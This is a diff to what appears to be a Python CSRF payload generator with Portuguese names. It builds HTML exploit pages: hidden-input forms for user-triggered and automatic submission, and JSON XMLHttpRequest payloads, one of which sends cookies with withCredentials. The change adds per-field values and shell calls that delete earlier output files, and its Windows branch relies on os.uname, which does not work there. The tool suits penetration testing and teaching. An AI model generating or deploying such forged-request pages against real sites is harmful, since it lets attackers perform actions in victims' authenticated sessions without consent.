@@ -1,24 +1,37 @@
+import os
 
 # GENERATE PAYLOADS AND PARSE INFO
 
-class Generator():
+class CSRF():
 
-    def __init__(self:object,action:str,method:str,name:list):
+    def __init__(self:object,action:str=0,method:str=0,name:list=0,values:list="__valor__"):
         self.__action = action
         self.__method = method
         self.__name = name
+        self.__value = values
+        self.__error = "Error, name and value with different numbers of arguments"
+
+    @property
+    def Error(self:object):
+        return self.__error
     
     def CsrfUserInteraction(self:object):
         dicionario = {}
-        for name in self.__name:
-            dicionario[name] = f"\t<input name=\"{name}\" value=\"__valor__\" type=\"hidden\"/>\r\n"
+        for name,value in enumerate(self.__name):
+            dicionario[self.__name[name]] = f"\t<input name=\"{value}\" value=\"{self.__value[name]}\" type=\"hidden\"/>\r\n"
 
         lista = ["<!DOCTYPE html>\r\n",
             "<html lang=\"pt-br\">\r\n",
             "<body>\r\n",
             f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
             "\t</form>\r\n"
-            "</body>\r\n"]
+            "</body>\r\n"]  
+
+        if "csrf.html" in os.listdir():
+            if "Linux" in list(os.uname()):
+                os.system("rm -f csrf.html")
+            elif "Windows" in list(os.uname()):
+                os.system("del csrf.html")
 
         with open("./csrf.html","a") as arquivo:
             for tag in lista:
@@ -31,8 +44,8 @@ class Generator():
 
     def CsrfNoUserInteraction(self:object):
         dicionario = {}
-        for name in self.__name:
-            dicionario[name] = f"\t<input name=\"{name}\" value=\"__valor__\" type=\"hidden\"/>\r\n"
+        for name,value in enumerate(self.__name):
+            dicionario[self.__name[name]] = f"\t<input name=\"{value}\" value=\"{self.__value[name]}\" type=\"hidden\"/>\r\n"
 
         lista = ["<!DOCTYPE html>\r\n",
             "<html lang=\"pt-br\">\r\n",
@@ -40,6 +53,12 @@ class Generator():
             f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
             "\t</form>\r\n"
             "</body>\r\n"]
+
+        if "csrf_nouser.html" in os.listdir():
+            if "Linux" in list(os.uname()):
+                os.system("rm -f csrf_nouser.html")
+            elif "Windows" in list(os.uname()):
+                os.system("del csrf_nouser.html")
 
         with open("./csrf_nouser.html","a") as arquivo:
             for tag in lista:
@@ -52,8 +71,8 @@ class Generator():
 
     def CsrfJson(self:object):
         dicionario = {}
-        for name in self.__name:
-            dicionario[name] = "__valor__"
+        for name,value in enumerate(self.__name):
+            dicionario[self.__name[name]] = self.__value[name]
         
         lista = ["<!DOCTYPE html>\r\n",
             "<html lang=\"pt-br\">\r\n",
@@ -64,7 +83,13 @@ class Generator():
             "\tcsrf.setRequestHeader(\"Content-Type\",\"application/json\");\r\n"
             ]
 
-        with open("./csrfjson.html","a") as arquivo:
+        if "csrfjson1.html" in os.listdir():
+            if "Linux" in list(os.uname()):
+                os.system("rm -f csrfjson1.html")
+            elif "Windows" in list(os.uname()):
+                os.system("del csrfjson1.html")    
+
+        with open("./csrfjson1.html","a") as arquivo:
             for tag in lista:
                 arquivo.write(tag)
                 if "setRequestHeader" in tag:
@@ -75,8 +100,8 @@ class Generator():
 
     def CsrfJsonCredentials(self:object):
         dicionario = {}
-        for name in self.__name:
-            dicionario[name] = "__valor__"
+        for name,value in enumerate(self.__name):
+            dicionario[self.__name[name]] = self.__value[name]
         
         lista = ["<!DOCTYPE html>\r\n",
             "<html lang=\"pt-br\">\r\n",
@@ -88,7 +113,13 @@ class Generator():
             "\tcsrf.withCredentials = true;\r\n"
             ]
 
-        with open("./csrfjson.html","a") as arquivo:
+        if "csrfjson2.html" in os.listdir():
+            if "Linux" in list(os.uname()):
+                os.system("rm -f csrfjson2.html")
+            elif "Windows" in list(os.uname()):
+                os.system("del csrfjson2.html")      
+
+        with open("./csrfjson2.html","a") as arquivo:
             for tag in lista:
                 arquivo.write(tag)
                 if "withCredentials" in tag:
